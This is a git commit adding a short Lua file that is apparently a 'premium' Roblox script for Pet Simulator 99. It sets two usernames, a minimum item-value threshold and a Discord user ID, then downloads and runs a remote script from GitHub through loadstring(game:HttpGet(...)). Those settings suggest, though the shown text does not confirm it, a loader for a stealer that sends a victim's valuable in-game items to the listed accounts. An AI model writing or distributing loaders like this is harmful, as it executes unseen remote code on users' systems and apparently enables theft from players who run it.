440364c0081ef069fb52dfcf2d6786e948808aeb
mrxver555 <hhhhihohbvj@gmail.com>
2025-02-20 02:48:14 +0800

    Add files via upload

---
+++ PREMps99(MS).lua
@@ -0,0 +1,6 @@
+_G.Username = "kxvsGG"
+_G.Username2 = "kevb1001"
+_G.minrap = 10000000
+_G.discuser = "1153332469823709294" -- change to your Discord user ID
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mrxver555/Wompwomp/refs/heads/main/PREMIUMps99(TOBI).lua"))()
